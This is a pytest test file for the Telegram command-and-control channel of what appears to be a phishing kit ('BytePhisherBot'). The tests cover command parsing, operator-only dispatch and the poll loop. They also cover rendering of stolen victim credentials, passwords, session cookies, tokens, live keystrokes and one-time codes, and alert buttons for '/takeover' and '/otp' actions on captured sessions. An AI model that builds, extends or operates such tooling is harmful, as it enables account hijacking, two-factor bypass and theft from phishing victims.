"""Telegram control channel: parsing, dispatch, rendering, and the poll loop.

Everything here runs against an injected transport, so no network is touched and
the assertions are about real behaviour: which chat may command the bot, how a
long message is split, that an inline button runs its command, and that the loop
stops when told to.

Run:  ./.venv/bin/python -m pytest tests/test_telegram.py -v
"""
import os
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import telegram as tg

# tier marker: the Makefile and pyproject document `pytest -m unit` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.unit



class FakeAPI:
    """Stands in for api.telegram.org: records calls, replays queued updates."""

    def __init__(self, updates=None, fail=False):
        self.calls = []
        self.updates = list(updates or [])
        self.fail = fail

    def __call__(self, url, payload, timeout=10):
        self.calls.append({"url": url, "payload": dict(payload or {})})
        if self.fail:
            raise OSError("network down")
        if url.endswith("/getUpdates"):
            out = self.updates
            self.updates = []
            return {"ok": True, "result": out}
        return {"ok": True, "result": {"message_id": 1}}

    @property
    def methods(self):
        return [c["url"].rsplit("/", 1)[-1] for c in self.calls]

    def texts(self):
        return [c["payload"].get("text") for c in self.calls
                if c["url"].endswith("sendMessage")]


def make(api, chat="42", allowed=None, token="T"):
    c2 = tg.C2(token, chat, transport=api, allowed_chats=allowed)
    return c2


# ================================================================== parsing ==
class TestParse:
    def test_a_plain_message(self):
        chat, text, cb = tg.C2.parse({"update_id": 1, "message": {
            "chat": {"id": 42}, "text": "/stats"}})
        assert (chat, text, cb) == ("42", "/stats", None)

    def test_an_edited_message_counts_too(self):
        chat, text, _ = tg.C2.parse({"edited_message": {"chat": {"id": 7}, "text": "/help"}})
        assert chat == "7" and text == "/help"

    def test_a_callback_query_carries_the_command(self):
        chat, text, cb = tg.C2.parse({"callback_query": {
            "id": "cb1", "data": "/live abc", "message": {"chat": {"id": 42}}}})
        assert (chat, text, cb) == ("42", "/live abc", "cb1")

    def test_garbage_is_survivable(self):
        for junk in (None, 5, "x", {}, {"message": None}, {"message": {"chat": None}},
                     {"callback_query": "nope"}):
            assert tg.C2.parse(junk) == (None, None, None)


class TestSplitCommand:
    @pytest.mark.parametrize("text,name,args", [
        ("/stats", "stats", []),
        ("/session abc123", "session", ["abc123"]),
        ("/session abc123 extra", "session", ["abc123", "extra"]),
        ("/Stats@BytePhisherBot now", "stats", ["now"]),
        ("stats", "stats", []),
        ("", "", []),
        ("/", "", []),
        ("   /live  sid  ", "live", ["sid"]),
    ])
    def test_forms(self, text, name, args):
        assert tg.C2.split_command(text) == (name, args)


# ================================================================= dispatch ==
class TestDispatch:
    def test_only_the_operator_chat_may_command(self):
        api = FakeAPI()
        c2 = make(api, chat="42", allowed=["42"])
        c2.register("stats", lambda a: "counters")
        assert c2.dispatch("42", "/stats") == "counters"
        assert c2.dispatch("99", "/stats") is None          # a stranger
        assert api.calls == []                              # and nothing was sent

    def test_an_unknown_command_explains_itself(self):
        c2 = make(FakeAPI())
        c2.register("stats", lambda a: "x", "counters")
        out = c2.dispatch("42", "/nope")
        assert "unknown command" in out and "/stats" in out

    def test_help_lists_the_registry(self):
        c2 = make(FakeAPI())
        c2.register("stats", lambda a: "x", "campaign counters")
        c2.register("live", lambda a: "x", "live input stream")
        for cmd in ("/help", "/start", "help"):
            out = c2.dispatch("42", cmd)
            assert "/stats" in out and "/live" in out and "campaign counters" in out

    def test_a_failing_command_reports_instead_of_crashing(self):
        c2 = make(FakeAPI())
        def boom(_args):
            raise ValueError("bad sid")
        c2.register("session", boom)
        out = c2.dispatch("42", "/session x")
        assert "failed" in out and "ValueError" in out and "bad sid" in out

    def test_arguments_reach_the_command(self):
        seen = {}
        c2 = make(FakeAPI())
        c2.register("block", lambda a: seen.setdefault("args", a) or "ok")
        c2.dispatch("42", "/block 1.2.3.4")
        assert seen["args"] == ["1.2.3.4"]


# ================================================================ transport ==
class TestSend:
    def test_a_short_message_is_one_call(self):
        api = FakeAPI()
        c2 = make(api)
        assert c2.send("hello") == 1
        assert api.methods == ["sendMessage"]
        assert api.calls[0]["payload"]["chat_id"] == "42"

    def test_a_long_message_is_split_on_lines(self):
        api = FakeAPI()
        c2 = make(api)
        text = "\n".join(f"line {i} " + "x" * 100 for i in range(80))
        assert len(text) > tg.MAX_TEXT
        assert c2.send(text) > 1
        assert all(len(c["payload"]["text"]) <= tg.MAX_TEXT for c in api.calls)

    def test_buttons_become_an_inline_keyboard(self):
        api = FakeAPI()
        c2 = make(api)
        c2.send("hit", buttons=[[("Takeover", "/takeover abc")], [("Live", "/live abc")]])
        kb = api.calls[0]["payload"]["reply_markup"]["inline_keyboard"]
        assert kb[0][0] == {"text": "Takeover", "callback_data": "/takeover abc"}
        assert kb[1][0]["text"] == "Live"

    def test_a_transport_failure_does_not_raise(self):
        c2 = make(FakeAPI(fail=True))
        assert c2.send("hello") == 0            # nothing sent, nothing thrown

    def test_answer_callback(self):
        api = FakeAPI()
        c2 = make(api)
        c2.answer_callback("cb1", "working")
        assert api.methods == ["answerCallbackQuery"]
        assert api.calls[0]["payload"]["callback_query_id"] == "cb1"


class TestAlertButtons:
    """An alert must carry the actions that follow it - and nothing more."""

    def test_a_session_capture_offers_actions(self):
        from core import alerts
        rows = alerts._buttons_for({"type": "session", "sid": "abc"})
        flat = [d for row in rows for _, d in row]
        assert "/takeover abc" in flat and "/live abc" in flat
        assert "/blockip abc" in flat

    def test_an_otp_capture_offers_the_codes_first(self):
        from core import alerts
        rows = alerts._buttons_for({"type": "otp", "sid": "abc"})
        assert rows[0][0][1] == "/otp abc"

    def test_a_plain_capture_offers_nothing(self):
        from core import alerts
        assert alerts._buttons_for({"type": "fields"}) is None
        assert alerts._buttons_for({"type": "session"}) is None      # no session id

    def test_the_message_carries_the_keyboard(self, monkeypatch):
        from core import alerts, net
        seen = {}

        def fake_post(url, payload, timeout=8, **kw):
            seen.update(payload)
            return (200, b'{"ok":true}')

        monkeypatch.setattr(net, "post_json", fake_post)
        alerts.send_telegram("T", "42", "hi", buttons=[[("Go", "/stats")]])
        assert seen["reply_markup"]["inline_keyboard"][0][0]["callback_data"] == "/stats"


class TestDefaultTransport:
    """core/net.post_json returns (status, body): the default transport must
    unpack it. Before this was fixed every reply looked like a failure and the
    CLI never processed a single command (found by running the CLI against a
    stub API, not by a unit test)."""

    def test_a_json_body_is_decoded(self, monkeypatch):
        from core import net
        monkeypatch.setattr(net, "post_json",
                            lambda url, payload, timeout=8, **kw: (200, b'{"ok":true,"result":[]}'))
        assert tg._default_transport("http://x/getUpdates", {}) == {"ok": True, "result": []}

    def test_a_non_json_body_is_a_clean_failure(self, monkeypatch):
        from core import net
        monkeypatch.setattr(net, "post_json",
                            lambda url, payload, timeout=8, **kw: (500, b"<html>oops</html>"))
        out = tg._default_transport("http://x/getUpdates", {})
        assert out["ok"] is False and "500" in out["description"]

    def test_an_already_decoded_reply_passes_through(self, monkeypatch):
        from core import net
        monkeypatch.setattr(net, "post_json",
                            lambda url, payload, timeout=8, **kw: {"ok": True, "result": [1]})
        assert tg._default_transport("http://x/getUpdates", {})["result"] == [1]


class TestGetUpdates:
    def test_the_offset_advances_past_seen_updates(self):
        api = FakeAPI(updates=[{"update_id": 10}, {"update_id": 11}])
        c2 = make(api)
        assert len(c2.get_updates()) == 2
        assert api.calls[0]["payload"]["offset"] == 0
        c2.get_updates()
        assert api.calls[1]["payload"]["offset"] == 12

    def test_a_malformed_result_is_empty(self):
        api = FakeAPI()
        api.__call__ = lambda url, payload, timeout=10: {"ok": False, "description": "nope"}
        c2 = make(api)
        assert c2.get_updates() == []

    def test_a_transport_error_is_empty(self):
        c2 = make(FakeAPI(fail=True))
        assert c2.get_updates() == []


# ============================================================ handle_update ==
class TestHandleUpdate:
    def test_a_command_runs_and_the_reply_is_sent(self):
        api = FakeAPI()
        c2 = make(api)
        c2.register("stats", lambda a: "5 sessions")
        out = c2.handle_update({"message": {"chat": {"id": 42}, "text": "/stats"}})
        assert out == "5 sessions"
        assert api.texts() == ["5 sessions"]

    def test_an_inline_button_answers_the_callback_then_runs_it(self):
        api = FakeAPI()
        c2 = make(api)
        c2.register("live", lambda a: f"live for {a[0]}")
        out = c2.handle_update({"callback_query": {"id": "cb9", "data": "/live abc",
                                                   "message": {"chat": {"id": 42}}}})
        assert out == "live for abc"
        assert "answerCallbackQuery" in api.methods
        assert api.texts() == ["live for abc"]

    def test_a_silent_command_sends_nothing(self):
        api = FakeAPI()
        c2 = make(api)
        c2.register("quiet", lambda a: None)
        assert c2.handle_update({"message": {"chat": {"id": 42}, "text": "/quiet"}}) is None
        assert api.texts() == []

    def test_a_foreign_chat_gets_no_reply(self):
        api = FakeAPI()
        c2 = make(api, chat="42")
        c2.register("stats", lambda a: "secret")
        assert c2.handle_update({"message": {"chat": {"id": 99}, "text": "/stats"}}) is None
        assert api.texts() == []


# ==================================================================== loop ===
class TestLoop:
    def test_the_loop_processes_updates_and_stops(self):
        api = FakeAPI(updates=[{"message": {"chat": {"id": 42}, "text": "/stats"}}])
        c2 = make(api)
        c2.register("stats", lambda a: "ok")
        t = c2.start(poll_timeout=0)
        for _ in range(50):
            if api.texts():
                break
            time.sleep(0.05)
        c2.stop()
        t.join(timeout=5)
        assert not t.is_alive()
        assert api.texts() == ["ok"]

    def test_a_transport_failure_does_not_kill_the_loop(self):
        c2 = make(FakeAPI(fail=True))
        t = c2.start(poll_timeout=0)
        time.sleep(0.3)
        alive = t.is_alive()
        c2.stop()
        t.join(timeout=5)
        assert alive, "the poll loop must survive a transport error"


# ============================================================== rendering ====
class TestRendering:
    def test_sessions_list(self):
        out = tg.render_sessions([
            {"sid": "abcdef1234567890", "state": "session", "ip": "1.2.3.4",
             "city": "Mumbai", "country": "IN", "credentials": {"username": "a"},
             "cookies": [{"name": "s"} for _ in range(3)]},
            {"sid": "ffff", "state": "opened", "ip": "5.6.7.8"},
        ])
        assert "abcdef123456" in out and "session" in out and "creds:username" in out
        assert "cookies:3" in out and "Mumbai" in out

    def test_no_sessions(self):
        assert tg.render_sessions([]) == "no sessions yet"

    def test_one_session_shows_credentials_tokens_and_cookies(self):
        out = tg.render_session({
            "sid": "s1", "state": "session", "ip": "1.2.3.4", "country": "IN",
            "credentials": {"username": "james", "password": "hunter2"},
            "tokens": ["auth_token"], "device_token": "dev1",
            "cookies": [{"name": "auth_token", "domain": "example.test"}],
            "timeline": [{"what": "creds", "detail": "username,password"}],
        })
        assert "username = james" in out and "password = hunter2" in out
        assert "auth_token" in out and "dev1" in out and "creds:" in out

    def test_missing_session(self):
        assert tg.render_session(None) == "session not found"

    def test_live_view_flags_a_one_time_code(self):
        events = [{"k": "input", "n": "user", "v": "james", "len": 5, "t": "text"},
                  {"k": "input", "n": "otp", "v": "123456", "len": 6, "t": "text"}]
        out = tg.render_live(events)
        assert "user [text] = james" in out
        assert "otp [text] = 123456" in out and "one-time code" in out
        assert "codes seen: otp" in out

    def test_live_view_when_empty(self):
        assert tg.render_live([]) == "no live input recorded"

    def test_otp_view(self):
        out = tg.render_otp([{"k": "input", "n": "code", "v": "4821", "ms": 900}])
        assert "code = 4821" in out and "900ms" in out
        assert tg.render_otp([]) == "no input recorded"

    def test_alert_buttons_carry_the_session(self):
        rows = tg.alert_buttons("abc", kind="otp")
        flat = [b for row in rows for b in row]
        assert any("takeover abc" in data for _, data in flat)
        assert any("otp abc" in data for _, data in flat)
        assert all(data.startswith("/") for _, data in flat)

    def test_chunking_keeps_every_line(self):
        text = "\n".join(f"line{i} " + "y" * 120 for i in range(200))
        parts = tg.chunk(text)
        assert len(parts) > 1
        assert sum(p.count("line") for p in parts) == 200
        assert all(len(p) <= tg.MAX_TEXT for p in parts)
        assert parts[0].startswith("line0") and parts[-1].endswith("y")

    def test_a_short_single_line_is_one_part(self):
        assert tg.chunk("z" * 10) == ["z" * 10]

    def test_a_single_over_long_line_is_hard_split(self):
        """A captured value or an error can be one huge line: sending it as one
        part exceeds Telegram's 4096 limit and the message is rejected."""
        parts = tg.chunk("A" * 9000, limit=3900)
        assert len(parts) > 1
        assert max(len(p) for p in parts) <= 3900
        assert "".join(parts) == "A" * 9000

    def test_an_over_long_line_between_short_ones_keeps_every_line(self):
        parts = tg.chunk("first\n" + "B" * 5000 + "\nlast", limit=1000)
        assert parts[0] == "first"
        assert parts[-1] == "last"
        assert "".join(parts[1:-1]) == "B" * 5000


class TestParseIsTotal:
    """The docstring promises total parsing, and the poll loop depends on it: a malformed
    update must not raise inside the thread that watches a campaign."""

    @pytest.mark.parametrize("update", [
        {"message": {"chat": "not-a-dict", "text": "hi"}},
        {"message": {"chat": 5, "text": "hi"}},
        {"message": {"chat": ["x"], "text": "hi"}},
        {"message": {"chat": None, "text": None}},
        {"message": "nope"},
        {"callback_query": {"message": {"chat": "nope"}, "data": "x", "id": "1"}},
        {"callback_query": {"message": "nope", "data": "x", "id": "1"}},
        {"callback_query": {}},
        None, [], "x", 7,
    ])
    def test_a_malformed_update_never_raises(self, update):
        chat, text, callback = tg.C2.parse(update)
        for value in (chat, text, callback):
            assert value is None or isinstance(value, str)

    def test_a_well_formed_update_still_parses(self):
        chat, text, callback = tg.C2.parse({"message": {"chat": {"id": 42},
                                                          "text": "/stats"}})
        assert (chat, text, callback) == ("42", "/stats", None)

    def test_a_well_formed_callback_still_parses(self):
        chat, data, callback = tg.C2.parse(
            {"callback_query": {"message": {"chat": {"id": 7}}, "data": "live:sid",
                                "id": "cb-1"}})
        assert (chat, data, callback) == ("7", "live:sid", "cb-1")
